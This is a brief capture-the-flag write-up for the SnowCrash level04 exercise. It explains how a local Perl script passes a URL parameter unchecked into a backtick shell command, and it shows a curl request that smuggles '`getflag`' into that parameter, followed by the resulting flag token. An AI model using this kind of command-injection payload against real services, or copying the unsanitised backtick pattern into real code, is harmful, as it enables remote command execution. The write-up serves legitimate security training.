Here we have a perl script that listen to localhost:4747 and echo the `x` parameter.

The most important statement in this script is the following:

```perl
print `echo $y 2>&1`;
```

It just print the value of `$y` (which is the `x` param) without any check.

So I decide to use the `backticks` around the `x` param.
This will allow me to execute a command before printing it.

I send the following:

```bash
level04@SnowCrash:~$ curl localhost:4747/level04.pl?x='`getflag`'
```

And I receive this as output:

```bash
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```
